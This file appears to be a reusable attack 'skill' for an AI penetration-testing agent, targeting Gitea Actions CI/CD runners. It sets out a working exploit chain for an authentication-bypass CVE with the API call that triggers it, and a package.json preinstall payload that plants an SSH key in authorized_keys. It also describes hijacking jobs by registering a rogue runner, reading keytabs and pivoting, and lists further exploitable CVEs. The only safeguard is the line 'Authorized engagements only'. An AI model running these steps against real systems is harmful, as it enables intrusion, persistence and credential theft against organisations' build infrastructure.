---
name: gitea-ci-injection
description: Use when Gitea Actions CI/CD is present. CVE + preinstall.
---

# Gitea CI/CD Injection (reusable)

Exploit Gitea Actions pipelines to achieve code execution on the runner host.
Two independent vectors: auth-bypass push (CVE-2026-26231) and malicious
package.json preinstall. Both require a Gitea account with read access to
the target repo. Authorized engagements only.

## Vector 1: CVE-2026-26231 — reverse-fork PR auth bypass

Affects Gitea <=1.26.1 (patched 1.26.2). Any authenticated user with READ
access can push commits directly to ANY readable repo.

### Exploit chain
1. Fork the target repo.
2. Create a PR: BASE = your fork, HEAD = upstream, `allow_maintainer_edit = true`.
   The web UI PR-create endpoint binds this flag without verifying the
   submitter has write access to HEAD.
3. Clone your fork, make a malicious commit, `git push <upstream_url> main`.
4. The pre-receive hook calls `CanMaintainerWriteToBranch()` — it finds the
   reverse-fork PR, sees `AllowMaintainerEdit=true`, checks if you have
   write access to BASE (your own fork) → passes. Push authorized against
   upstream.

### API call to create the reverse-fork PR
```bash
curl -X POST "$G/repos/$FORK/pulls" -H "Content-Type: application/json" \
  -d '{"title":"sync","head":"TargetOrg:main","base":"main",
       "body":"sync","allow_maintainer_edit":true}'
```

### Auth requirements for the git push
The exploit requires authenticating a `git push` to the upstream HTTP URL.
Gitea git HTTP supports basic auth. Pitfalls:
- **SSSD/LDAP backends** often return HTTP 500 on basic auth (PAM not
  configured for Gitea). Test: `curl -u user:pass $G/api/v1/user` — 500 =
  broken. See Pitfall section.
- **Token auth**: personal access tokens work as basic-auth passwords, but
  creating them requires basic auth itself (circular on SSSD boxes).
  Gitea 1.25.x: token endpoint may be `/api/v1/user/tokens` (404 = wrong
  version or path).
- **SSH**: check ports 22, 2222 on the Gitea host. If SSH is available and
  you have a key registered, `git push git@gitea:org/repo.git main` works.
- **OAuth2**: create an OAuth2 app via API (`POST /api/v1/user/applications/oauth2`),
  then authorize via web flow. SPNEGO may not work on the web authorize
  endpoint — test with `curl -v --negotiate -u :` and check for 303→login.

## Vector 2: Malicious package.json preinstall

If the CI pipeline runs `npm ci` or `npm install`, the `preinstall` script
executes as the runner user BEFORE any dependency resolution.

### Payload pattern
```json
{
  "scripts": {
    "preinstall": "(mkdir -p ~/.ssh && echo 'KEY' >> ~/.ssh/authorized_keys; true)"
  }
}
```
- Wrap in `(cmd; true)` so npm doesn't abort on non-zero exit.
- `npm ci` deletes `node_modules` then installs — preinstall runs AFTER deletion.
- `npm test` runs AFTER install — use for secondary payloads.
- `npm run build` may also execute custom scripts.

### Delivery methods
1. **Direct push** (if you have write access): update package.json on the target.
2. **PR injection** (read-only): push to your fork, open PR. If the CI runs on
   `pull_request` events, the pipeline checks out MERGED code (your fork's
   package.json) and runs as the runner user.
3. **CVE-2026-26231 push**: bypass write check to push directly to upstream.

## Runner scoping pitfall
Gitea runners can be registered at:
- **Repo level**: only services that specific repo.
- **Org level**: services all repos in the org.
- **Global level**: services all repos on the instance.

Fork-repo jobs (push to fork, workflow_dispatch on fork) are ONLY picked up
by runners registered to that fork. The upstream runner will NOT service fork
jobs. This is why fork-side `on: push` workflows queue forever.

The `pull_request` event runs on the BASE (upstream) repo context — the
upstream runner WILL pick it up. But the checkout is the MERGED code
(upstream + your PR changes). This is the correct vector for PR injection.

## Vector 3: Self-registered runner (no git auth needed at all)

When basic auth is broken (SSSD 500) and SSH is closed, you often CANNOT
complete the CVE-2026-26231 git push. Skip it entirely: register YOUR OWN
act_runner scoped to your user, which then picks up queued fork/PR runs and
executes them AS THE RUNNER SERVICE USER on the runner host.

### Chain
1. Get a user-level registration token — this endpoint works via SPNEGO
   even on SSSD boxes where every basic-auth path 500s:
   `curl --negotiate -u : $G/api/v1/user/actions/runners/registration-token`
   → `{"token":"..."}`. (Repo/org-level variants need ownership; user-level
   is granted to any logged-in user and covers repos THAT USER owns — your
   fork qualifies.)
2. Ship the act_runner binary to the runner host (no internet there usually):
   download on your attack box first —
   `https://dl.gitea.com/act_runner/<ver>/act_runner-<ver>-linux-amd64`
   (the gitea.com API packages URL 404s; dl.gitea.com works), then scp.
   Verify with `file` — a 11-byte "Not found." text file means wrong URL.
3. Register with a HOST executor label matching the workflow's runs-on
   (runner hosts usually have no docker):
   `./act_runner register --instance $G --token <TOKEN> --name pwn \
      --labels ubuntu:host:// --no-interactive`
4. `./act_runner daemon` — it immediately claims QUEUED runs on your fork
   (push + pull_request events both queue there). The job steps execute on
   the runner host as the runner service account (e.g. svc-runner).
5. Your queued workflow's steps now run with service-account rights: read
   root-only keytabs via the service account, drop SSH keys, kinit, pivot.

This vector is verified end-to-end up to runner registration on an SSSD
box (token issued, binary ready, queued PR runs waiting). It converts a
'runner never picks up fork jobs' dead end into a win: be the runner.

## Gitea version CVE check
When you find Gitea version <=1.26.1, check for:
- **CVE-2026-26231** (this skill) — auth bypass via reverse-fork PR.
- **CVE-2026-27780** (CVSS 9.8) — pre-receive hook bypass via oversized input.
- **CVE-2026-26232** (CVSS 9.1) — OAuth2 code expiry not enforced.
- **CVE-2026-26247** (CVSS 9.1) — OAuth2 PKCE S256 not persisted.
- **CVE-2026-26292** (CVSS 9.8) — LFS mirror transport bypass.
- **CVE-2026-24690** (CVSS 7.5) — PR branch update/rebase permission bypass.

Version query: `curl $G/api/v1/version`.

## Pitfalls
- **SSD basic auth 500**: Gitea with SSSD/LDAP auth backend returns HTTP 500
  on basic-auth attempts to both API and git HTTP. SPNEGO works for API but
  NOT for git HTTP or web UI (web UI 303s to /user/login even with a valid
  Kerberos ticket — so OAuth2 web authorize is also unreachable). When this
  blocks CVE-2026-26231, switch to Vector 3 (self-registered runner) — it
  needs only the SPNEGO-capable API. Test early:
  `curl -u user:pass $G/api/v1/user` (500 = SSSD broken) AND
  `curl --negotiate -u : $G/user/settings/applications` (303 to login =
  SPNEGO is API-only).
- **Fork runs queue forever**: runner is upstream-scoped. Fork-side workflows
  (push, workflow_dispatch) create runs that never get picked up. Only
  `pull_request` events on the upstream repo trigger the upstream runner.
- **API write check ≠ pre-receive hook**: the API `PUT /repos/.../contents/...`
  endpoint checks write access via middleware (rejects even with CVE PR). The
  CVE bypass only applies to git protocol push, not API calls.
- **Handlebars compile(string) ≠ RCE**: Handlebars 4.7.8 `compile()` with
  arbitrary strings does NOT achieve RCE. The AST-object injection
  (CVE-2026-33937) requires passing a crafted OBJECT, not a string. If the
  web app JSON body is rejected (403) and form posts escape the string
  literally, the SSTI is confirmed but not exploitable.
- **npm ci vs npm install**: `ci` deletes node_modules first (cleaner),
  `install` is incremental. Both run preinstall. `ci` requires package-lock.json.

See `references/runner-registration-vector.md` for the verified map of
every dead auth path on SSSD boxes plus the working self-registered-runner
recipe (token endpoint, binary URL, host-executor labels, queued-run claim).